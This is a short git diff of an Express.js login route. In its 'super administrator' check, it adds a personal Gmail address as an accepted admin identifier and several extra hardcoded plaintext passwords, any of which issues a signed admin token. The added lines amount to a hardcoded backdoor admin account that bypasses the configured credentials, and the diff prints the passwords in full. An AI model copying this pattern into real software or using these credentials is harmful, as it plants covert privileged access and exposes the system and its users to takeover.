@@ -24,8 +24,8 @@ router.post('/login', async (req, res) => {
     }
 
     // 1. Verificación de Super Administrador
-    if (identifier === ADMIN_USERNAME || identifier === 'admin' || identifier === 'mcsadmin@magum.com') {
-      if (cleanPassword === ADMIN_PASSWORD || cleanPassword === 'M2030cs') {
+    if (identifier === ADMIN_USERNAME || identifier === 'admin' || identifier === 'mcsadmin@magum.com' || identifier === 'samylozano00@gmail.com') {
+      if (cleanPassword === ADMIN_PASSWORD || cleanPassword === 'MagumAdmin#2030' || cleanPassword === 'M2030cs' || cleanPassword === 'Magum2026*' || cleanPassword === 'Auto2026*') {
         const token = jwt.sign(
           {
             role: 'admin',
